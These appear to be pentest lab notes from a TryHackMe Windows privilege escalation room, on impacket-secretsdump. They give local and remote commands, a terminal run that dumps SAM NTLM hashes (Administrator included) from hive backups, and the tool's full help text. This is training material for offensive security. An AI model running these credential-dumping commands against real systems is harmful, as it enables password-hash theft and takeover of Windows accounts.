
local
`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`

remote
`impacket-secretsdump -sam sam.hive -system system.hive "DC01$":@10.10.232.150`


secretsdump - LOCAL using downloaded "backup" files
```sh
┌──(kali㉿kali)-[~/thm/windowsprivesc]
└─$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
[*] Cleaning up... 
```

### Help

```sh
┌──(kali㉿proxli)-[~/exploits]
└─$ impacket-secretsdump -h                                     
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

usage: secretsdump.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY] [-security SECURITY] [-sam SAM]
                      [-ntds NTDS] [-resumefile RESUMEFILE] [-skip-sam] [-skip-security]
                      [-outputfile OUTPUTFILE] [-use-vss] [-rodcNo RODCNO] [-rodcKey RODCKEY] [-use-keylist]
                      [-exec-method [{smbexec,wmiexec,mmcexec}]] [-use-remoteSSMethod]
                      [-remoteSS-remote-volume REMOTESS_REMOTE_VOLUME]
                      [-remoteSS-local-path REMOTESS_LOCAL_PATH] [-just-dc-user USERNAME]
                      [-ldapfilter LDAPFILTER] [-just-dc] [-just-dc-ntlm] [-skip-user SKIP_USER]
                      [-pwd-last-set] [-user-status] [-history] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                      [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address] [-target-ip ip address]
                      target

Performs various techniques to dump secrets from the remote machine without executing any agent there.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address> or LOCAL (if you want to parse
                        local files)

options:
  -h, --help            show this help message and exit
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -system SYSTEM        SYSTEM hive to parse
  -bootkey BOOTKEY      bootkey for SYSTEM hive
  -security SECURITY    SECURITY hive to parse
  -sam SAM              SAM hive to parse
  -ntds NTDS            NTDS.DIT file to parse
  -resumefile RESUMEFILE
                        resume file name to resume NTDS.DIT session dump (only available to DRSUAPI
                        approach). This file will also be used to keep updating the session´s state
  -skip-sam             Do NOT parse the SAM hive on remote system
  -skip-security        Do NOT parse the SECURITY hive on remote system
  -outputfile OUTPUTFILE
                        base output filename. Extensions will be added for sam, secrets, cached and ntds
  -use-vss              Use the NTDSUTIL VSS method instead of default DRSUAPI
  -rodcNo RODCNO        Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)
  -rodcKey RODCKEY      AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)
  -use-keylist          Use the Kerb-Key-List method instead of default DRSUAPI
  -exec-method [{smbexec,wmiexec,mmcexec}]
                        Remote exec method to use at target (only when using -use-vss). Default: smbexec
  -use-remoteSSMethod   Remotely create Shadow Snapshot via WMI and download SAM, SYSTEM and SECURITY from
                        it, the parse locally
  -remoteSS-remote-volume REMOTESS_REMOTE_VOLUME
                        Remote Volume to perform the Shadow Snapshot and download SAM, SYSTEM and SECURITY
  -remoteSS-local-path REMOTESS_LOCAL_PATH
                        Path where download SAM, SYSTEM and SECURITY from Shadow Snapshot. It defaults to
                        current path

display options:
  -just-dc-user USERNAME
                        Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI
                        approach. Implies also -just-dc switch
  -ldapfilter LDAPFILTER
                        Extract only NTDS.DIT data for specific users based on an LDAP filter. Only available
                        for DRSUAPI approach. Implies also -just-dc switch
  -just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
  -just-dc-ntlm         Extract only NTDS.DIT data (NTLM hashes only)
  -skip-user SKIP_USER  Do NOT extract NTDS.DIT data for the user specified. Can provide comma-separated list
                        of users to skip, or text file with one user per line
  -pwd-last-set         Shows pwdLastSet attribute for each NTDS.DIT account. Doesn´t apply to -outputfile
                        data
  -user-status          Display whether or not the user is disabled
  -history              Dump password history, and LSA secrets OldVal

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don´t ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on
                        target parameters. If valid credentials cannot be found, it will use the ones
                        specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN)
                        specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as
                        target. This is useful when target is the NetBIOS name and you cannot resolve it
```
